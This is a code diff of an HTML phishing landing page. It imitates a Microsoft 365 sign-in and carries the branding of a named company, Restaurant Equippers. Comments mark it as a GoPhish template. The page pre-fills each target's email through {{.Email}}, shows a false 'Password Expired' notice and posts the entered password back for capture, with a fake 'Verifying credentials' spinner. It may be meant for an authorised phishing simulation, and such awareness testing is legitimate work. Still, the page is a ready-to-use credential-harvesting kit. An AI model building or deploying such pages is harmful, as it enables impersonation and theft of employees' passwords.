@@ -3,257 +3,480 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Sign in - Microsoft Azure</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
     <style>
-        * {
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
+        html, body {
+            height: 100%;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+            font-size: 15px;
+            background-color: #000000;
+        }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 50%, #f0f0f0 100%);
-            min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header with company branding - RED */
+        .company-header {
+            background: #c41230;
+            padding: 10px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 56px;
+        }
+
+        /* Left logo - Restaurant Equippers */
+        .logo-left {
+            display: flex;
             align-items: center;
         }
 
+        .logo-left svg {
+            height: 36px;
+            width: auto;
+        }
+
+        /* Right logo area */
+        .logo-right {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-right svg {
+            height: 32px;
+            width: auto;
+        }
+
+        /* Main content area - BLACK */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #000000;
+            padding: 40px 20px;
+        }
+
+        /* Login container - WHITE */
         .login-container {
             background: #ffffff;
+            width: 440px;
+            max-width: 100%;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-inner {
             padding: 44px;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-            min-width: 440px;
-            max-width: 440px;
         }
 
-        .company-banner {
-            background: #cc0000;
-            padding: 12px 20px;
-            margin: -44px -44px 30px -44px;
+        /* Microsoft logo */
+        .microsoft-branding {
             display: flex;
             align-items: center;
-            justify-content: center;
+            margin-bottom: 20px;
         }
 
-        .company-logo {
-            max-height: 50px;
-        }
-
-        .company-name {
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-            text-align: center;
-        }
-
-        .company-name span {
-            display: block;
-            font-size: 12px;
-            font-weight: normal;
-            letter-spacing: 2px;
-        }
-
-        .microsoft-logo {
-            display: flex;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-
-        .microsoft-logo svg {
-            width: 108px;
-            height: 24px;
-        }
-
-        .ms-squares {
+        .ms-logo {
             display: grid;
-            grid-template-columns: 10px 10px;
-            grid-template-rows: 10px 10px;
+            grid-template-columns: 11px 11px;
+            grid-template-rows: 11px 11px;
             gap: 2px;
             margin-right: 8px;
         }
 
-        .ms-squares div:nth-child(1) { background: #f25022; }
-        .ms-squares div:nth-child(2) { background: #7fba00; }
-        .ms-squares div:nth-child(3) { background: #00a4ef; }
-        .ms-squares div:nth-child(4) { background: #ffb900; }
+        .ms-logo div:nth-child(1) { background: #f25022; }
+        .ms-logo div:nth-child(2) { background: #7fba00; }
+        .ms-logo div:nth-child(3) { background: #00a4ef; }
+        .ms-logo div:nth-child(4) { background: #ffb900; }
 
-        .ms-text {
-            font-size: 20px;
+        .ms-wordmark {
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 21px;
             font-weight: 600;
             color: #5e5e5e;
-            font-family: 'Segoe UI', sans-serif;
+            letter-spacing: -0.5px;
         }
 
+        /* Page title */
         h1 {
             font-size: 24px;
             font-weight: 600;
             color: #1b1b1b;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
+            line-height: 1.2;
         }
 
+        /* Session notice - RED accent */
         .session-notice {
-            background: #fff4ce;
-            border-left: 4px solid #ffb900;
-            padding: 12px 16px;
+            background: #fef2f2;
+            border-left: 4px solid #c41230;
+            padding: 14px 16px;
             margin-bottom: 24px;
             font-size: 13px;
-            color: #5e5e5e;
+            color: #1f1f1f;
+            line-height: 1.6;
         }
 
+        .session-notice strong {
+            color: #c41230;
+        }
+
+        /* User display */
+        .user-display {
+            display: flex;
+            align-items: center;
+            padding: 12px 0;
+            margin-bottom: 12px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #c41230;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            font-weight: 600;
+            margin-right: 14px;
+            flex-shrink: 0;
+        }
+
+        .user-email {
+            font-size: 15px;
+            color: #1b1b1b;
+            font-weight: 500;
+            word-break: break-all;
+        }
+
+        /* Form elements */
         .form-group {
-            margin-bottom: 16px;
-        }
-
-        .form-group label {
-            display: none;
+            margin-bottom: 20px;
+            position: relative;
         }
 
         .form-group input {
             width: 100%;
-            padding: 10px 12px;
-            border: none;
-            border-bottom: 1px solid #666;
+            padding: 12px 14px;
+            border: 1px solid #605e5c;
+            border-radius: 2px;
             font-size: 15px;
+            font-family: 'Segoe UI', sans-serif;
+            color: #1b1b1b;
+            background: #ffffff;
             outline: none;
-            background: transparent;
+            transition: border-color 0.15s, box-shadow 0.15s;
         }
 
         .form-group input:focus {
-            border-bottom: 2px solid #0067b8;
+            border-color: #c41230;
+            box-shadow: 0 0 0 1px #c41230;
         }
 
         .form-group input::placeholder {
-            color: #666;
+            color: #605e5c;
         }
 
+        /* Hidden email field for GoPhish */
+        .hidden-email {
+            display: none;
+        }
+
+        /* Keep me signed in checkbox */
+        .keep-signed-in {
+            margin-bottom: 20px;
+        }
+
+        .keep-signed-in label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            color: #1b1b1b;
+        }
+
+        .keep-signed-in input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #c41230;
+            cursor: pointer;
+        }
+
+        /* Links */
         .links {
-            margin: 16px 0 24px 0;
+            margin-bottom: 24px;
         }
 
         .links a {
-            color: #0067b8;
+            display: block;
+            color: #c41230;
             text-decoration: none;
             font-size: 13px;
-            display: block;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
+            font-weight: 500;
         }
 
         .links a:hover {
             text-decoration: underline;
-            color: #004578;
+            color: #a00f28;
         }
 
-        .button-container {
+        /* Buttons - RED branded */
+        .btn-primary {
+            background: #c41230;
+            color: #ffffff;
+            border: none;
+            padding: 11px 28px;
+            min-width: 120px;
+            font-size: 15px;
+            font-family: 'Segoe UI', sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            border-radius: 2px;
+        }
+
+        .btn-primary:hover {
+            background: #a50f2a;
+        }
+
+        .btn-primary:active {
+            background: #8a0c23;
+        }
+
+        .button-row {
             display: flex;
             justify-content: flex-end;
-        }
-
-        .btn-next {
-            background: #0067b8;
-            color: white;
-            border: none;
-            padding: 10px 40px;
-            font-size: 15px;
-            cursor: pointer;
-            font-family: 'Segoe UI', sans-serif;
-        }
-
-        .btn-next:hover {
-            background: #005a9e;
-        }
-
-        .sign-in-options {
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid #e5e5e5;
-            text-align: center;
-        }
-
-        .sign-in-options a {
-            color: #5e5e5e;
-            text-decoration: none;
-            font-size: 13px;
-            display: inline-flex;
-            align-items: center;
             gap: 8px;
         }
 
-        .key-icon {
-            width: 16px;
-            height: 16px;
+        /* Sign-in options */
+        .sign-in-options {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e1e1;
         }
 
-        .footer-text {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            font-size: 11px;
+        .sign-in-options a {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             color: #5e5e5e;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .sign-in-options a:hover {
+            color: #1b1b1b;
+        }
+
+        /* Footer - BLACK */
+        .footer {
+            background: #000000;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 24px;
+            border-top: 3px solid #c41230;
+        }
+
+        .footer a {
+            color: #8a8a8a;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer a:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        /* Loading overlay */
+        .loading {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.97);
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e5e5e5;
+            border-top: 3px solid #c41230;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loading-text {
+            color: #5e5e5e;
+            font-size: 13px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="company-banner">
-            <div class="company-name">
-                RESTAURANT<br>EQUIPPERS
-                <span>WAREHOUSE STORES</span>
-            </div>
+    <!-- Company Header - RED -->
+    <div class="company-header">
+        <!-- Left: Restaurant Equippers Logo (white on red) -->
+        <div class="logo-left">
+            <svg viewBox="0 0 280 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- RESTAURANT text -->
+                <text x="0" y="18" fill="#ffffff" font-family="Arial Black, Arial, sans-serif" font-size="16" font-weight="900" letter-spacing="1">RESTAURANT</text>
+                <!-- EQUIPPERS text -->
+                <text x="0" y="38" fill="#ffffff" font-family="Arial Black, Arial, sans-serif" font-size="20" font-weight="900" letter-spacing="1">EQUIPPERS</text>
+                <!-- WAREHOUSE STORES text -->
+                <text x="145" y="38" fill="#ffffff" font-family="Arial, sans-serif" font-size="9" font-weight="400" letter-spacing="2">WAREHOUSE STORES</text>
+            </svg>
         </div>
 
-        <div class="microsoft-logo">
-            <div class="ms-squares">
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
-            </div>
-            <span class="ms-text">Microsoft</span>
-        </div>
-
-        <h1>Sign in</h1>
-
-        <div class="session-notice">
-            Your session has expired. Please sign in again to reset your password.
-        </div>
-
-        <form method="POST" action="">
-            <div class="form-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Password" required>
-            </div>
-
-            <div class="links">
-                <a href="#">Forgot my password</a>
-                <a href="#">Sign-in options</a>
-            </div>
-
-            <div class="button-container">
-                <button type="submit" class="btn-next">Sign in</button>
-            </div>
-        </form>
-
-        <div class="sign-in-options">
-            <a href="#">
-                <svg class="key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <circle cx="8" cy="15" r="4"/>
-                    <line x1="10.5" y1="12.5" x2="19" y2="4"/>
-                    <line x1="16" y1="7" x2="19" y2="4"/>
-                    <line x1="19" y1="4" x2="19" y2="7"/>
-                    <line x1="19" y1="4" x2="16" y2="4"/>
-                </svg>
-                Sign-in options
-            </a>
+        <!-- Right: Microsoft 365 branding -->
+        <div class="logo-right">
+            <svg viewBox="0 0 140 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Microsoft squares -->
+                <rect x="0" y="6" width="9" height="9" fill="#f25022"/>
+                <rect x="10" y="6" width="9" height="9" fill="#7fba00"/>
+                <rect x="0" y="16" width="9" height="9" fill="#00a4ef"/>
+                <rect x="10" y="16" width="9" height="9" fill="#ffb900"/>
+                <!-- Microsoft 365 text -->
+                <text x="24" y="20" fill="#ffffff" font-family="Segoe UI, Arial, sans-serif" font-size="13" font-weight="600">Microsoft 365</text>
+            </svg>
         </div>
     </div>
 
-    <div class="footer-text">Terms of use &nbsp; Privacy & cookies</div>
+    <!-- Main Content - BLACK background -->
+    <div class="main-content">
+        <div class="login-container">
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <div class="loading-text">Verifying credentials...</div>
+            </div>
+
+            <div class="login-inner">
+                <!-- Microsoft Logo -->
+                <div class="microsoft-branding">
+                    <div class="ms-logo">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                    <span class="ms-wordmark">Microsoft</span>
+                </div>
+
+                <h1>Enter password</h1>
+
+                <div class="session-notice">
+                    <strong>Password Expired:</strong> Your Microsoft 365 password has expired. Please enter your password to verify your identity, then you will be prompted to create a new password.
+                </div>
+
+                <form method="POST" action="" id="loginForm">
+                    <!-- User display - DYNAMIC from GoPhish -->
+                    <div class="user-display">
+                        <div class="user-avatar" id="avatar"></div>
+                        <span class="user-email" id="userEmail">{{.Email}}</span>
+                    </div>
+
+                    <!-- Hidden field to capture email -->
+                    <input type="hidden" name="email" value="{{.Email}}">
+
+                    <div class="form-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required autofocus>
+                    </div>
+
+                    <div class="keep-signed-in">
+                        <label>
+                            <input type="checkbox" checked>
+                            <span>Keep me signed in</span>
+                        </label>
+                    </div>
+
+                    <div class="links">
+                        <a href="#">Forgot my password</a>
+                    </div>
+
+                    <div class="button-row">
+                        <button type="submit" class="btn-primary">Sign in</button>
+                    </div>
+                </form>
+
+                <div class="sign-in-options">
+                    <a href="#">
+                        <svg class="option-icon" viewBox="0 0 20 20" fill="currentColor" style="width:20px;height:20px;">
+                            <path d="M17 8V6a5 5 0 00-10 0v2H5v10h14V8h-2zm-8-2a3 3 0 116 0v2H9V6zm7 10H8v-6h8v6z"/>
+                        </svg>
+                        Use Windows Hello or a security key
+                    </a>
+                    <a href="#" style="margin-top: 8px;">
+                        <svg class="option-icon" viewBox="0 0 20 20" fill="currentColor" style="width:20px;height:20px;">
+                            <path d="M10 2a8 8 0 100 16 8 8 0 000-16zm1 11H9v-2h2v2zm0-4H9V5h2v4z"/>
+                        </svg>
+                        Other ways to sign in
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer - BLACK with RED accent -->
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">...</a>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            document.getElementById('loading').style.display = 'flex';
+        });
+
+        // Generate initials from email
+        (function() {
+            var email = document.getElementById('userEmail').textContent.trim();
+            var avatar = document.getElementById('avatar');
+            var initials = 'RE'; // Default fallback
+
+            if (email && email.indexOf('@') > 0) {
+                // Extract initials from email (e.g., john.doe@company.com -> JD)
+                var localPart = email.split('@')[0];
+                var parts = localPart.split(/[._-]/);
+                if (parts.length >= 2) {
+                    initials = (parts[0][0] + parts[1][0]).toUpperCase();
+                } else if (parts[0].length >= 2) {
+                    initials = parts[0].substring(0, 2).toUpperCase();
+                }
+            }
+            avatar.textContent = initials;
+        })();
+    </script>
 </body>
 </html>
